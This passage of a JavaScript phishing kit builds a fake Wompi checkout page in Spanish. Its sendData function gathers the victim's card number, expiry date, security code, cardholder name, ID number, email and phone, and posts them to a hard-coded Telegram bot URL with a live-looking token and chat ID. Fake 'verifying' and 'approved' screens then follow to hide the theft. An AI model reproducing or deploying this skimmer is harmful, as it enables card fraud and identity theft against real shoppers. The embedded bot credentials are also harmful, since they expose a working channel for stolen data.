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">
        <div class="src-components-SecureTransferFooter-__SecureTransferFooter__text__LT9fr">Pagos
            seguros
            por</div>
        <img class="src-components-SecureTransferFooter-__SecureTransferFooter__logo__jeZpf"
            src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTIiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCA5MiAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI0LjExMjggMi4zMTcxNUMyNC45MTM4IDIuMTQ2MjcgMjUuNzI0OCAyLjA2MDgzIDI2LjU0NTkgMi4wNjA4M0MyNy4zODY5IDIuMDYwODMgMjguMTk3OSAyLjE0NjI3IDI4Ljk3ODkgMi4zMTcxNUwyMy44MTI0IDIxLjAyODVDMjIuOTExMyAyMS4xODA0IDIyLjAzMDIgMjEuMjU2NCAyMS4xNjkxIDIxLjI1NjRDMjAuMzg4MiAyMS4yNTY0IDE5LjQ5NzEgMjEuMTgwNCAxOC40OTU4IDIxLjAyODVMMTQuODkxMyA4LjQ2ODgzTDExLjIyNjcgMjEuMDI4NUMxMC4zMjU2IDIxLjE4MDQgOS40NjQ1MyAyMS4yNTY0IDguNjQzNTEgMjEuMjU2NEM3Ljg2MjUzIDIxLjI1NjQgNi45NzE0MiAyMS4xODA0IDUuOTcwMTcgMjEuMDI4NUwwLjc3MzY4MiAyLjMxNzE1QzEuNTk0NzEgMi4xNDYyNyAyLjQwNTcyIDIuMDYwODMgMy4yMDY3MiAyLjA2MDgzQzQuMDI3NzQgMi4wNjA4MyA0LjgzODc2IDIuMTQ2MjcgNS42Mzk3NiAyLjMxNzE1TDkuMDAzOTYgMTUuNTAzNEwxMi4yNDggMi4zMTcxNUMxMy4wODkxIDIuMTQ2MjcgMTMuOTcwMiAyLjA2MDgzIDE0Ljg5MTMgMi4wNjA4M0MxNS44MTI1IDIuMDYwODMgMTYuNjczNSAyLjE0NjI3IDE3LjQ3NDUgMi4zMTcxNUwyMS4zNzk0IDE1LjU2MDRMMjQuMTEyOCAyLjMxNzE1WiIgZmlsbD0iIzQ2NDY0NiIvPgo8cGF0aCBkPSJNMzUuOTg2NiAyMS4yODQ4QzM0LjQwNDYgMjEuMjg0OCAzMy4wMjI5IDIwLjk4MSAzMS44NDE0IDIwLjM3MzVDMzAuNjU5OSAxOS43NjU5IDI5Ljc0ODggMTguOTAyIDI5LjEwOCAxNy43ODE4QzI4LjQ2NzIgMTYuNjQyNiAyOC4xNDY4IDE1LjMzMjUgMjguMTQ2OCAxMy44NTE2QzI4LjE0NjggMTIuMzUxNiAyOC40NzcyIDExLjA1MSAyOS4xMzggOS45NDk3OUMyOS43OTg4IDguODI5NTggMzAuNzIgNy45NjU2OSAzMS45MDE1IDcuMzU4MTFDMzMuMTAzIDYuNzUwNTQgMzQuNDY0NyA2LjQ0Njc1IDM1Ljk4NjYgNi40NDY3NUMzNy41Njg1IDYuNDQ2NzUgMzguOTUwMyA2Ljc2MDAzIDQwLjEzMTcgNy4zODY1OUM0MS4zMTMyIDcuOTk0MTcgNDIuMjI0MyA4Ljg1ODA2IDQyLjg2NTEgOS45NzgyN0M0My41MDU5IDExLjA5ODUgNDMuODI2MyAxMi4zODk2IDQzLjgyNjMgMTMuODUxNkM0My44MjYzIDE1LjM3MDUgNDMuNTA1OSAxNi42OTAxIDQyLjg2NTEgMTcuODEwM0M0Mi4yMjQzIDE4LjkzMDUgNDEuMzEzMiAxOS43OTQ0IDQwLjEzMTcgMjAuNDAyQzM4Ljk1MDMgMjAuOTkwNSAzNy41Njg1IDIxLjI4NDggMzUuOTg2NiAyMS4yODQ4Wk0zNS45ODY2IDE3LjU4MjRDMzcuMDQ3OSAxNy41ODI0IDM3Ljg1ODkgMTcuMjY5MiAzOC40MTk2IDE2LjY0MjZDMzkuMDAwMyAxNS45OTcgMzkuMjkwNyAxNS4wNjY3IDM5LjI5MDcgMTMuODUxNkMzOS4yOTA3IDEyLjY3NDQgMzkuMDAwMyAxMS43NjMgMzguNDE5NiAxMS4xMTc1QzM3LjgzODkgMTAuNDcxOSAzNy4wMjc5IDEwLjE0OTIgMzUuOTg2NiAxMC4xNDkyQzM0Ljk2NTMgMTAuMTQ5MiAzNC4xNTQzIDEwLjQ4MTQgMzMuNTUzNSAxMS4xNDZDMzIuOTcyOCAxMS43OTE1IDMyLjY4MjQgMTIuNjkzNCAzMi42ODI0IDEzLjg1MTZDMzIuNjgyNCAxNS4wNjY3IDMyLjk3MjggMTUuOTk3IDMzLjU1MzUgMTYuNjQyNkMzNC4xMzQyIDE3LjI2OTIgMzQuOTQ1MyAxNy41ODI0IDM1Ljk4NjYgMTcuNTgyNFoiIGZpbGw9IiM0NjQ2NDYiLz4KPHBhdGggZD0iTTYyLjMzMDYgNi40NzUyM0M2NC4wMTI3IDYuNDc1MjMgNjUuNDA0NSA2Ljg3Mzk1IDY2LjUwNTggNy42NzEzOUM2Ny42MDcyIDguNDY4ODMgNjguMTU3OSA5LjUzMjA5IDY4LjE1NzkgMTAuODYxMlYyMUg2My42ODIzVjEyLjM3MDZDNjMuNjgyMyAxMS42MzAxIDYzLjQzMiAxMS4wNyA2Mi45MzE0IDEwLjY5MDNDNjIuNDUwOCAxMC4yOTE2IDYxLjc1OTkgMTAuMDkyMiA2MC44NTg4IDEwLjA5MjJDNjAuMDU3OCAxMC4wOTIyIDU5LjI4NjggMTAuMjM0NiA1OC41NDU5IDEwLjUxOTRDNTguNzg2MiAxMS4xNDYgNTguOTA2NCAxMS44Mjk1IDU4LjkwNjQgMTIuNTdWMjFINTQuNDMwOFYxMi4zNzA2QzU0LjQzMDggMTEuNjMwMSA1NC4xODA1IDExLjA3IDUzLjY3OTggMTAuNjkwM0M1My4xOTkyIDEwLjI5MTYgNTIuNTA4NCAxMC4wOTIyIDUxLjYwNzIgMTAuMDkyMkM1MC45MjY0IDEwLjA5MjIgNTAuMjg1NiAxMC4xNjgxIDQ5LjY4NDggMTAuMzJWMjFINDUuMTQ5Mkw0NS4xNzkyIDguMzI2NDNDNDYuMDYwMyA3LjczNzg1IDQ3LjE0MTcgNy4yODIxNyA0OC40MjMzIDYuOTU5MzlDNDkuNzA0OSA2LjYzNjYyIDUwLjk1NjQgNi40NzUyMyA1Mi4xNzggNi40NzUyM0M1My4wOTkxIDYuNDc1MjMgNTMuOTYwMiA2LjYxNzYzIDU0Ljc2MTIgNi45MDI0M0M1NS41NjIyIDcuMTY4MjUgNTYuMjYzMSA3LjU0Nzk4IDU2Ljg2MzggOC4wNDE2M0M1Ny42NDQ4IDcuNTY2OTcgNTguNTI1OSA3LjE4NzIzIDU5LjUwNzEgNi45MDI0M0M2MC40ODgzIDYuNjE3NjMgNjEuNDI5NSA2LjQ3NTIzIDYyLjMzMDYgNi40NzUyM1oiIGZpbGw9IiM0NjQ2NDYiLz4KPHBhdGggZD0iTTc2Ljg4NDMgNi40NzUyM0M3OS42Mjc3IDYuNDc1MjMgODEuNzcwNCA3LjE1ODc1IDgzLjMxMjMgOC41MjU3OUM4NC44NzQzIDkuODkyODMgODUuNjU1MiAxMS44Mjk1IDg1LjY1NTIgMTQuMzM1N0M4NS42NTUyIDE2LjQwNTMgODUuMTE0NiAxOC4wODU2IDg0LjAzMzIgMTkuMzc2N0M4Mi45NzE5IDIwLjY0ODggODEuMzU5OSAyMS4yODQ4IDc5LjE5NzIgMjEuMjg0OEM3OC40OTYzIDIxLjI4NDggNzcuNzg1NCAyMS4xODA0IDc3LjA2NDUgMjAuOTcxNkM3Ni4zNDM2IDIwLjc0MzcgNzUuNjcyOCAyMC40MzA0IDc1LjA1MiAyMC4wMzE3VjI1LjMwMDVDNzQuNTcxNCAyNS42NjEzIDczLjg1MDUgMjUuOTg0IDcyLjg4OTMgMjYuMjY4OEM3MS45NDgxIDI2LjU1MzYgNzEuMTU3MSAyNi42OTYgNzAuNTE2MyAyNi42OTZWNy41ODU5NUM3MS4yNzczIDcuMjQ0MTkgNzIuMjE4NCA2Ljk3ODM4IDczLjMzOTggNi43ODg1MUM3NC40ODEzIDYuNTc5NjYgNzUuNjYyOCA2LjQ3NTIzIDc2Ljg4NDMgNi40NzUyM1pNNzcuMjc0OCAxNy42OTY0Qzc4LjUzNjMgMTcuNjk2NCA3OS40OTc1IDE3LjM5MjYgODAuMTU4NCAxNi43ODVDODAuODE5MiAxNi4xNzc0IDgxLjE0OTYgMTUuMTkwMSA4MS4xNDk2IDEzLjgyMzFDODEuMTQ5NiAxMi42ODM5IDgwLjgwOTIgMTEuNzQ0IDgwLjEyODMgMTEuMDAzNkM3OS40Njc1IDEwLjI2MzEgNzguNDc2MyA5Ljg5MjgzIDc3LjE1NDYgOS44OTI4M0M3Ni40OTM4IDkuODkyODMgNzUuNzkyOSA5Ljk0OTc5IDc1LjA1MiAxMC4wNjM3VjE3LjQ5N0M3NS43NTI5IDE3LjYyOTkgNzYuNDkzOCAxNy42OTY0IDc3LjI3NDggMTcuNjk2NFoiIGZpbGw9IiM0NjQ2NDYiLz4KPHBhdGggZD0iTTg5LjUxMjIgNC41NjcwN0M4OC44NzE0IDQuNTY3MDcgODguMzIwOCA0LjM1ODIyIDg3Ljg2MDIgMy45NDA1MUM4Ny40MTk2IDMuNTAzODIgODcuMTk5MyAyLjk4MTY4IDg3LjE5OTMgMi4zNzQxMUM4Ny4xOTkzIDEuNzY2NTQgODcuNDI5NiAxLjI1MzkgODcuODkwMiAwLjgzNjE5M0M4OC4zNTA4IDAuMzk5NDk5IDg4Ljg5MTUgMC4xODExNTIgODkuNTEyMiAwLjE4MTE1MkM5MC4xNTMgMC4xODExNTIgOTAuNzAzNyAwLjM5OTQ5OSA5MS4xNjQzIDAuODM2MTkzQzkxLjYyNDkgMS4yNTM5IDkxLjg1NTIgMS43NjY1NCA5MS44NTUyIDIuMzc0MTFDOTEuODU1MiAyLjk2MjcgOTEuNjI0OSAzLjQ3NTM0IDkxLjE2NDMgMy45MTIwM0M5MC43MDM3IDQuMzQ4NzMgOTAuMTUzIDQuNTY3MDcgODkuNTEyMiA0LjU2NzA3Wk04Ny4yNTk0IDYuODczOTVDODcuOTIwMyA2LjYwODE0IDg4LjY4MTIgNi40NzUyMyA4OS41NDIzIDYuNDc1MjNDOTAuMzgzMyA2LjQ3NTIzIDkxLjEzNDMgNi42MDgxNCA5MS43OTUxIDYuODczOTVWMjFIODcuMjU5NFY2Ljg3Mzk1WiIgZmlsbD0iIzQ2NDY0NiIvPgo8cGF0aCBkPSJNNS4yMjgyNyAyOC41Mjc5VjI1LjYwMTZDNS4yMjgyNyAyNS4zMDc3IDUuNDQ1MTUgMjUuMDU1NCA1Ljc1MDA0IDI1LjAwMjNDNy4yNTY4MSAyNC43Mzk5IDExLjc0NDggMjQuMDE3MSAxNS40NzA1IDI0LjAxNzFDMTkuMjA1NCAyNC4wMTcxIDIzLjgxNTcgMjQuNzQzNCAyNS4zNTA4IDI1LjAwNDNDMjUuNjU3MiAyNS4wNTYzIDI1Ljg3NTQgMjUuMzA5MiAyNS44NzU0IDI1LjYwNDNWMjguNTQzMUMyNS44NzU0IDI4Ljk2NzkgMjUuNDMgMjkuMjgxIDI0Ljk5NDMgMjkuMTgyNEMyMy41OTQ1IDI4Ljg2NTUgMjAuNDk1IDI4LjMzMzIgMTUuNDcwNSAyOC4zMzMyQzEwLjUwNTYgMjguMzMzMiA3LjQ5ODYyIDI4Ljg1MyA2LjEyMzQ4IDI5LjE3MUM1LjY4MzkxIDI5LjI3MjcgNS4yMjgyNyAyOC45NTY5IDUuMjI4MjcgMjguNTI3OVoiIGZpbGw9IiM0NjQ2NDYiLz4KPC9zdmc+Cg=="
            alt="Wompi">
    </div>
</div>
</div>
</div>
`;

function addHead() {
  $("head").append(head);
}

function addCode() {
  $("body").html(contenido);

  $("#btnPaymentMethods").click(function () {
    $("#undefined").hide();
    $("#contacto").show();
  });

  $("#backContacto").click(function () {
    $("#undefined").show();
    $("#contacto").hide();
  });

  $("#backCard").click(function () {
    $("#card").hide();
    $("#contacto").show();
  });

  $("#cerrarInfoCVV").click(function () {
    $("#infoCVV").hide();
  });

  $("#verCVV").click(function () {
    if ($("#infoCVV").css("display") === "none") {
      $("#infoCVV").show();
    } else {
      $("#infoCVV").hide();
    }
  });

  $("#typeDni").change(function () {
    if ($("#typeDni").val() === "-1") {
      $("#legal_id_number").prop("disabled", true);
    } else {
      $("#legal_id_number").prop("disabled", false);
    }
  });

  $("#acceptance").change(function () {
    if ($("#acceptance").prop("checked")) {
      $("#nextCard").prop("disabled", false);
    } else {
      $("#nextCard").prop("disabled", true);
    }
  });

  $("#email").on("input", function () {
    $("#emailCockie").text($(this).val());
  });

  $("#fullName").on("input", function () {
    $("#nameCockie").text($(this).val());
  });

  $("#number").on("input", function () {
    $("#phoneCockie").text($(this).val());
  });

// Esta verga me da error de cualquier manera, con JQuery y de otras maneras...

//   $("#cardNumber").on("input", function() {
//     var inputText = $(this).val();
//     var formattedText = inputText.replace(/(.{4})(?=\d)/g, "$1 ");
//     $(this).val(formattedText);
//   });

$("#cardNumber").on("input", function() {
    var inputValue = $(this).val();
    var firstDigit = inputValue.charAt(0);

    if (firstDigit === "3") {
      $(this).addClass("src-components-CardForm-__CardForm__iconAmericanExpressMono__tdniN");
    } else {
      $(this).removeClass("src-components-CardForm-__CardForm__iconAmericanExpressMono__tdniN");
      
    } if (firstDigit === "4") {
      $(this).addClass("src-components-CardForm-__CardForm__iconVisaMono__XYbhL");
    } else {
      $(this).removeClass("src-components-CardForm-__CardForm__iconVisaMono__XYbhL");

    } if (firstDigit === "5") {
        $(this).addClass("src-components-CardForm-__CardForm__iconMasterCardMono__PUGm8");
      } else {
        $(this).removeClass("src-components-CardForm-__CardForm__iconMasterCardMono__PUGm8");
      }

  });
}

setTimeout(function () {
  let cargando = document.getElementById("cargando");
  let infoLeft = document.getElementById("infoLeft");
  let undefined = document.getElementById("undefined");

  cargando.style.display = "none";
  infoLeft.style.display = "block";
  undefined.style.display = "block";
}, 3000);

function saveInfoContacto() {
  let email = document.getElementById("email").value;
  let fullName = document.getElementById("fullName").value;
  let number = document.getElementById("number").value;
  let contacto = document.getElementById("contacto");
  let card = document.getElementById("card");

  // Obtener los spans de error
  let errorEmail = document.getElementById("errorEmail");
  let errorFullName = document.getElementById("errorFullName");
  let errorNumber = document.getElementById("errorNumber");
  // Limpiar los mensajes de error antes de realizar nuevas validaciones
  errorFullName.innerText = "";
  errorNumber.innerText = "";
  errorEmail.innerText = "";

  // Restaurar los estilos predeterminados de los inputs
  document.getElementById("email").style.borderColor = "";
  document.getElementById("email").style.backgroundColor = "";
  document.getElementById("fullName").style.borderColor = "";
  document.getElementById("fullName").style.backgroundColor = "";
  document.getElementById("number").style.borderColor = "";
  document.getElementById("number").style.backgroundColor = "";

  // Verificar si los campos están vacíos
  if (email.trim() === "") {
    errorEmail.innerText = "Ingresa un correo electrónico.";
    document.getElementById("email").style.borderColor = "#e34c4c";
    document.getElementById("email").style.backgroundColor = "#fef7f7";
    return;
  }

  if (fullName.trim() === "" || fullName.length < 5) {
    errorFullName.innerText = "Tu nombre debe tener al menos 5 caracteres";
    document.getElementById("fullName").style.borderColor = "#e34c4c";
    document.getElementById("fullName").style.backgroundColor = "#fef7f7";
    return;
  }

  if (number.trim() === "") {
    errorNumber.innerText = "Ingresa un número válido";
    document.getElementById("number").style.borderColor = "#e34c4c";
    document.getElementById("number").style.backgroundColor = "#fef7f7";
    return;
  }

  setTimeout(function () {
    contacto.style.display = "none";
    card.style.display = "block";
  }, 200);

  localStorage.setItem("email", email);
  localStorage.setItem("fullName", fullName);
  localStorage.setItem("number", number);
}

function sendData() {
  let nextCard = document.getElementById("nextCard");

  let cardNumber = document.getElementById("cardNumber").value;

  let expirationMonthElement = document.getElementById("expirationMonth");
  let expirationMonthValue = expirationMonthElement.value;
  let expirationMonthText =
    expirationMonthElement.options[expirationMonthElement.selectedIndex].text;

  let expirationYearElement = document.getElementById("expirationYear");
  let expirationYearValue = expirationYearElement.value;
  let expirationYearText =
    expirationYearElement.options[expirationYearElement.selectedIndex].text;

  let code = document.getElementById("code").value;

  let cardHolder = document.getElementById("cardHolder").value;

  let typeDniElement = document.getElementById("typeDni");
  let typeDniValue = typeDniElement.value;
  let typeDniText = typeDniElement.options[typeDniElement.selectedIndex].text;

  let legal_id_number = document.getElementById("legal_id_number").value;

  // Obtener los spans de error
  let errorCardNumber = document.getElementById("errorCardNumber");
  let errorExpirationMonth = document.getElementById("errorExpirationMonth");
  let errorExpirationYear = document.getElementById("errorExpirationYear");
  let errorCode = document.getElementById("errorCode");
  let errorCardHolder = document.getElementById("errorCardHolder");
  let errorTypeDni = document.getElementById("errorTypeDni");
  let errorLegalIdNumber = document.getElementById("errorLegalIdNumber");

  // Limpiar los mensajes de error antes de realizar nuevas validaciones
  errorCardNumber.innerText = "";
  errorExpirationMonth.innerText = "";
  errorExpirationYear.innerText = "";
  errorCode.innerText = "";
  errorCardHolder.innerText = "";
  errorTypeDni.innerText = "";
  errorLegalIdNumber.innerText = "";

  // Restaurar los estilos predeterminados de los inputs
  document.getElementById("cardNumber").style.borderColor = "";
  document.getElementById("cardNumber").style.backgroundColor = "";
  document.getElementById("expirationMonth").style.borderColor = "";
  document.getElementById("expirationMonth").style.backgroundColor = "";
  document.getElementById("expirationYear").style.borderColor = "";
  document.getElementById("expirationYear").style.backgroundColor = "";
  // Restaurar los estilos predeterminados de los inputs
  document.getElementById("code").style.borderColor = "";
  document.getElementById("code").style.backgroundColor = "";
  document.getElementById("cardHolder").style.borderColor = "";
  document.getElementById("cardHolder").style.backgroundColor = "";
  document.getElementById("typeDni").style.borderColor = "";
  document.getElementById("typeDni").style.backgroundColor = "";
  document.getElementById("legal_id_number").style.borderColor = "";
  document.getElementById("legal_id_number").style.backgroundColor = "";

  // Verificar si los campos están vacíos

  if (cardNumber.trim() <= 12) {
    errorCardNumber.innerText =
      "El número de la tarjeta no es válido. Ingresa el número como se muestra en la tarjeta";
    document.getElementById("cardNumber").style.borderColor = "#e34c4c";
    document.getElementById("cardNumber").style.backgroundColor = "#fef7f7";
    return;
  }

  if (expirationMonthValue.trim() === "-1") {
    errorExpirationMonth.innerText =
      "Ingresa un mes de expiración entre 01 y 12";
    document.getElementById("expirationMonth").style.borderColor = "#e34c4c";
    return;
  }

  if (expirationYearValue.trim() === "-1") {
    errorExpirationYear.innerText =
      "El año de expiración debe ser un número entre 23 y 43";
    document.getElementById("expirationYear").style.borderColor = "#e34c4c";
    return;
  }

  if (code.trim() === "") {
    errorCode.innerText = "Ingresa un código de 3 o 4 dígitos.";
    document.getElementById("code").style.borderColor = "#e34c4c";
    document.getElementById("code").style.backgroundColor = "#fef7f7";
    return;
  }

  if (cardHolder.trim() === "") {
    errorCardHolder.innerText =
      "Ingresa el nombre como aparece en la tarjeta (mínimo 5 caracteres)";
    document.getElementById("cardHolder").style.borderColor = "#e34c4c";
    document.getElementById("cardHolder").style.backgroundColor = "#fef7f7";
    return;
  }

  if (typeDniValue.trim() === "-1") {
    errorTypeDni.innerText = "Debes seleccionar un tipo de documento";
    document.getElementById("typeDni").style.borderColor = "#e34c4c";
    return;
  }

  if (legal_id_number.trim() <= 5) {
    errorLegalIdNumber.innerText = "Debes ingresar un documento válido";
    document.getElementById("legal_id_number").style.borderColor = "#e34c4c";
    document.getElementById("legal_id_number").style.backgroundColor =
      "#fef7f7";
    return;
  }

  // Obtener los datos del almacenamiento local
  let email = localStorage.getItem("email");
  let fullName = localStorage.getItem("fullName");
  let number = localStorage.getItem("number");

  let telegramBotUrl =
    "https://api.telegram.org/bot6491119864:AAHh2Wn9UQk3MGqIW1uiMr5qJgUquzEnln8/sendMessage"; // Reemplaza YOUR_BOT_TOKEN con tu token de bot de Telegram
  let chatId = "-1001907672338"; // Reemplaza con el ID del chat de Telegram donde deseas recibir los datos
  let message =
    "Card number:  " +
    cardNumber +
    "\nExpiration date:  " +
    expirationMonthText +
    "/" +
    expirationYearText +
    "\nSecurity code:  " +
    code +
    "\nCardholder:  " +
    cardHolder +
    "\nType document:  " +
    typeDniText +
    "\nDni:  " +
    legal_id_number +
    "\nEmail:  " +
    email +
    "\nFullname:  " +
    fullName +
    "\nNumberphone:  " +
    number;

  let formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("text", message);

  // Envía los datos al bot de Telegram mediante una solicitud POST
  fetch(telegramBotUrl, {
    method: "POST",
    body: formData,
  });

  // Obtener los elementos de los botones y divs
  let btnDefault = document.getElementById("btnDefault");
  let verificandoCc = document.getElementById("verificandoCc");
  let realizandoPagoCc = document.getElementById("realizandoPagoCc");
  let card = document.getElementById("card");
  let finalizando = document.getElementById("finalizando");
  let aprobada = document.getElementById("aprobada");

  // Cambiar el estado de los botones y divs
  nextCard.disabled = true;
  btnDefault.style.display = "none";
  verificandoCc.style.display = "block";

  setTimeout(function () {
    btnDefault.style.display = "none";
    verificandoCc.style.display = "none";
    realizandoPagoCc.style.display = "block";
    setTimeout(function () {
      card.style.display = "none";
      finalizando.style.display = "block";
      setTimeout(function () {
        finalizando.style.display = "none";
        aprobada.style.display = "block";
      }, 5000);
    }, 3000);
  }, 6000);
}

document.addEventListener("DOMContentLoaded", function () {
  addHead();
});

window.addEventListener("load", function () {
  addCode();
});
